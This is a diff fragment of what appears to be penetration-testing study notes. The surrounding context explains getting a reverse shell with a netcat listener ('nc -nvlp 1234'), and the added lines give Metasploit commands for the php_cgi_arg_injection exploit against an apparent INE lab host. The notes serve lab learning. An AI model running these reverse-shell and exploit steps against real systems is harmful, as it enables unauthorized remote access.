@@ -3235,4 +3235,18 @@ https://www.revshells.com/
 > There is a website where we can generate a reverse shell payload by entering the attacker's IP address and port (e.g., 1234). After generating the payload, we execute the `nc -nvlp 1234` command on the attacker's system to start a listener. Once the generated payload is executed on the victim's system on cmd, it establishes a connection back to the attacker's machine, granting remote access.
 
 
+#### Exploit PHP
+
+```url
+url/phpinfo.php
+```
+> version lower then 5.3.1
+
+```shell
+msfconsole
+use exploit/multi/http/php_cgi_arg_injection
+set RHOSTS demo.ine.local
+run
+```
+
 #### 
